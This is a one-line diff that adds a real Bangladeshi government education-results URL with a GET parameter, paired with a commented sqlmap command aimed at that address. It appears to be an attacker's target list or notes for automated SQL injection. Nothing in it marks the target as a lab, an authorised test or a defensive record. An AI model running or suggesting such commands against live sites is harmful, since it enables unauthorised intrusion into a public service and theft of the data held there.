@@ -1,0 +1,1 @@
+https://www.educationboardresults.gov.bd/counter.php?page=eb_log (GET)  # .\sqlmap.py -u https://www.educationboardresults.gov.bd/counter.php?page=eb_log
